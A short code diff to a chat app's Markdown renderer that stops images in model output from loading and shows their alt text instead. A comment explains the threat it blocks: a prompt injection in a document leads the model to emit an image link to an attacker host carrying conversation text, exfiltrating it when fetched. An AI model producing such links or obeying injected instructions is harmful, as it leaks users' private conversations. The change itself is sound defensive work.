@@ -16,6 +16,11 @@ interface MarkdownProps {
 
 export const Markdown = memo(function Markdown({ content, streaming, sources, onCite }: MarkdownProps) {
   const components: Components = {
+    // Never load images from model output: a prompt injection in a document could make the
+    // model emit ![](https://attacker/?q=<conversation text>) and leak data when the browser fetches it.
+    img({ alt }) {
+      return alt ? <span className="text-muted">[{alt}]</span> : null
+    },
     a({ href, children }) {
       if (href?.startsWith(CITATION_PREFIX)) {
         const n = Number(href.slice(CITATION_PREFIX.length))
